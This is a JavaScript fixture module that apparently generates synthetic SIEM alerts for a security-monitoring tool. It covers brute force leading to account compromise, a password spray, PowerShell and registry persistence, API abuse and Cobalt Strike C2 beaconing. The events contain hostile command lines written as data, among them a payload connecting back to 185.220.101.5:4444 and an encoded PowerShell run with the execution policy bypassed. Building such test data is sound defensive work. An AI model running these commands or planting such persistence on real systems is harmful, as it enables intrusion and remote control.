const base = '2026-09-19T03:00:00.000Z';
const at = (minutes, seconds = 0) => new Date(Date.parse(base) + minutes * 60000 + seconds * 1000).toISOString();
const agent = { id: '001', name: 'user-machine', ip: '192.168.0.249' };
const mitre = (id, tactic, technique) => ({ id: [id], tactic: [tactic], technique: [technique] });
const wazuh = (time, level, description, groups, data = {}, extra = {}, tags = mitre('T1110', 'Credential Access', 'Brute Force')) => ({
  timestamp: time, rule: { id: String(60000 + level), level, description, groups, mitre: tags }, agent, data, ...extra
});
const auth = (time, user, success, srcIp = '185.220.101.5') => wazuh(time, success ? 8 : 10, `Logon ${success ? 'Success' : 'Failure'} for user '${user}'`, ['windows', success ? 'authentication_success' : 'authentication_failed'], { srcip: srcIp, srcuser: user, win: { eventdata: { targetUserName: user, ipAddress: srcIp } } }, {}, mitre(success ? 'T1078' : 'T1110', success ? 'Defense Evasion' : 'Credential Access', success ? 'Valid Accounts' : 'Brute Force'));

export const scenarios = {
  account_compromise() {
    return [
      { timestamp: at(0), event_type: 'alert', src_ip: '185.220.101.5', src_port: 51234, dest_ip: agent.ip, dest_port: 80, proto: 'TCP', flow_id: '981240182', agent, alert: { action: 'allowed', signature: 'ET EXPLOIT Suspicious HTTP Request / Web Application Exploit Attempt', severity: 1 } },
      ...Array.from({ length: 5 }, (_, i) => auth(at(0, 10 + i * 4), 'admin', false)),
      auth(at(0, 35), 'admin', true),
      wazuh(at(0, 48), 12, 'Sysmon - File Created: Suspicious executable written to Temp directory', ['windows', 'process_creation'], { srcip: '185.220.101.5', win: { eventdata: { processName: 'payload.exe', commandLine: 'payload.exe --connect 185.220.101.5:4444', processId: '5812', targetFilename: 'C:\\Users\\Admin\\AppData\\Local\\Temp\\payload.exe' } } }, {}, mitre('T1059', 'Execution', 'Ingress Tool Transfer')),
      wazuh(at(0, 55), 12, 'Integrity checksum changed for critical system file', ['ossec', 'syscheck'], { srcip: '185.220.101.5' }, { syscheck: { path: 'C:\\Windows\\System32\\drivers\\etc\\hosts', event: 'modified' } }, mitre('T1565', 'Impact', 'Data Manipulation'))
    ];
  },
  password_spray() {
    return ['john.doe', 'finance.dept', 'db_admin', 'dev_ops', 'hr_manager'].map((user, i) => auth(at(-45, i * 5), user, false, '203.0.113.77'));
  },
  endpoint_persistence() {
    return [
      wazuh(at(-15), 11, 'Sysmon - Suspicious Encoded PowerShell Execution', ['windows', 'sysmon_event1'], { win: { eventdata: { image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', commandLine: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgA...', processId: '3412' } } }, {}, mitre('T1059.001', 'Execution', 'PowerShell')),
      wazuh(at(-15, 8), 10, 'FIM - Startup Run Key Modified for Persistence', ['ossec', 'syscheck'], {}, { syscheck: { path: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdaterService', event: 'modified' } }, mitre('T1547.001', 'Persistence', 'Registry Run Keys'))
    ];
  },
  app_abuse() {
    return Array.from({ length: 5 }, (_, i) => wazuh(at(10, i * 2), 7, 'Web server - Access denied / HTTP 403 Forbidden on API endpoint', ['web', 'accesslog'], { srcip: '198.51.100.22', dstip: agent.ip }, {}, mitre('T1078', 'Initial Access', 'Valid Accounts')));
  },
  c2() {
    const host = '192.168.1.50', peer = '45.33.32.156';
    const zeek = (time, uid, port, extra = {}) => ({ ts: Date.parse(time) / 1000, uid, 'id.orig_h': host, 'id.orig_p': port, 'id.resp_h': peer, 'id.resp_p': 443, proto: 'tcp', ...extra });
    return [
      { ts: Date.parse(at(-90)) / 1000, uid: 'CZK-DNS-01', 'id.orig_h': host, 'id.orig_p': 54120, 'id.resp_h': '1.1.1.1', 'id.resp_p': 53, proto: 'udp', service: 'dns', query: 'c2-cdn-edge.cloud-telemetry.org' },
      zeek(at(-90, 6), 'CZK-CONN-01', 49321, { service: 'ssl' }),
      zeek(at(-90, 9), 'CZK-TLS-01', 49321, { server_name: 'c2-cdn-edge.cloud-telemetry.org' }),
      { timestamp: at(-89, 15), event_type: 'alert', src_ip: host, src_port: 49321, dest_ip: peer, dest_port: 443, proto: 'TCP', flow_id: '189230912389', alert: { action: 'allowed', signature: 'ET MALWARE Cobalt Strike Malleable C2 Periodic Beaconing', severity: 1 } },
      zeek(at(-87, 10), 'CZK-CONN-02', 49325), zeek(at(-84, 50), 'CZK-CONN-03', 49330)
    ];
  }
};
